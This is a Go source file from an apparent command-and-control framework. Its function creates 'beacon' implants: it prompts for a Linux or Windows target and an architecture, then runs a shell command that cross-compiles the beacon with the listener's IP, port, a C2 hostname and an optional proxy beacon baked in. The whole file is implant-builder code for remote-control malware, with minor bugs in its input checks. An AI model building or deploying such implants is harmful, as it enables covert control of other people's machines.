package main

import (
	"os"
	"fmt"
	"bufio"
	"os/exec"
	"strings"
	"strconv"
)

var targets = []string{"linux", "windows"}

var platforms = map[string][]string {
	"linux": []string{"386", "amd64", "arm", "arm64"},
	"windows": []string{"386", "amd64"},
}

func createBeacon(listener int) {
	reader := bufio.NewReader(os.Stdin)

	listTargets()
	fmt.Print("Target: ")
	input, err := reader.ReadString('\n')
	num, err := strconv.Atoi(input[:len(input)-1])

	if err != nil || num < 0 || num > len(targets) {
		fmt.Println("Invalid choice.")
		return
	}

	target := targets[num]

	listPlatforms(target)
	fmt.Print("Platform: ")
	input, err = reader.ReadString('\n')
	num2, err := strconv.Atoi(input[:len(input)-1])

	if err != nil || num2 < 0 || num2 > len(platforms[target]) {
		fmt.Println("Invalid choice.")
		return
	}

	platform := getPlatform(num, num2)

	fmt.Println("Using " + target + "/" + platform)

	//fmt.Print("Proxy? (y/n): ")
	input = "n"//, err = reader.ReadString('\n')
	ip := getIfaceIp(listeners[listener].Iface)
	port := strconv.Itoa(listeners[listener].Port)
	beaconName := "beacon" + ip + "." + port	
	beaconId := genRandID()

	if target == "windows" {
		beaconName += ".exe"
	}

	//if err != nil {
	//	log.Fatal(err)
	//}

	if input == "y\n" {
		if len(beacons) == 0 {
			fmt.Println("No beacons to proxy to.")
			return
		}
		listBeacons()
		fmt.Print("Choose beacon: ")
		input, err := reader.ReadString('\n')
		input = strings.ReplaceAll(input, "\n", "")

		if err != nil {
			fmt.Println("Invalid input.")
			return
		}
		
		beacon := getBeaconByIdOrIndex(input)

		if beacon == nil {
			fmt.Println(input + " is not a beacon.")
			return
		}

		notifyBeaconOfProxyUpdate(beacon, beaconId)

		fmt.Println("Using beacon " + beacon.Id + "@" + beacon.Ip + " as proxy.")
		exec.Command("/bin/sh", "-c", "env CGO_ENABLED=0 GOOS=" + target + " GOARCH=" + platform + " go build -ldflags '-X main.id=" + beaconId + " -X main.cmdProxyId=" + beacon.Id + " -X main.cmdProxyIp=" + beacon.Ip + " -X main.cmdAddress=" + ip + " -X main.cmdPort=" + port + " -X main.cmdHost=command.com' -o out/" + beaconName + " beacon/*.go").Output()
	} else {
		fmt.Println("No proxy")
		exec.Command("/bin/sh", "-c", "env CGO_ENABLED=0 GOOS=" + target + " GOARCH=" + platform + " go build -ldflags '-X main.id=" + beaconId + " -X main.cmdAddress=" + ip + " -X main.cmdPort=" + port + " -X main.cmdHost=command.com' -o out/" + beaconName + " beacon/*.go").Output()
	}

	//beacon := &Beacon{"n/a", beaconId, nil, nil, nil, nil, time.Time{}}
	// beacons = append(beacons, beacon)
	fmt.Println("Saved beacon for listener " + getIfaceIp(listeners[listener].Iface) + ":" + strconv.Itoa(listeners[listener].Port) + "%" + listeners[listener].Iface + " to out/" + beaconName)
}

func listTargets() {
	for i, n := range targets {
		fmt.Println("[" + strconv.Itoa(i) + "]", n)
	}
}

func listPlatforms(target string) {
	i := 0
	for _, n := range platforms[target] {
		fmt.Println("[" + strconv.Itoa(i) + "]", n)
		i++
	}
}

func getPlatform(idx int, idxplatform int) string {
	target := targets[idx]
	for i, n := range platforms[target] {
		if i == idxplatform {
			return n
		}
		i++
	}
	return ""
}